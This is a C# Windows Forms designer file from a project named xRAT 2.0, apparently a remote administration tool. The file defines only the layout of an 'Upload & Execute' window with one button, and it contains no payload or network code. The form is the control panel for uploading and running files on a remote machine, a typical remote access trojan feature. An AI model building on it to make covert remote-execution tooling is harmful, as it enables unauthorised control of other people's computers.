namespace xRAT_2.Forms
{
    partial class frmUploadAndExecute
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmUploadAndExecute));
            this.btnUploadAndExecute = new System.Windows.Forms.Button();
            this.SuspendLayout();
            // 
            // btnUploadAndExecute
            // 
            this.btnUploadAndExecute.Location = new System.Drawing.Point(12, 12);
            this.btnUploadAndExecute.Name = "btnUploadAndExecute";
            this.btnUploadAndExecute.Size = new System.Drawing.Size(291, 36);
            this.btnUploadAndExecute.TabIndex = 0;
            this.btnUploadAndExecute.Text = "Upload && Execute";
            this.btnUploadAndExecute.UseVisualStyleBackColor = true;
            this.btnUploadAndExecute.Click += new System.EventHandler(this.btnUploadAndExecute_Click);
            // 
            // frmUploadAndExecute
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(315, 65);
            this.Controls.Add(this.btnUploadAndExecute);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "frmUploadAndExecute";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "xRAT 2.0 - Upload File & Execute []";
            this.Load += new System.EventHandler(this.frmUploadAndExecute_Load);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Button btnUploadAndExecute;
    }
}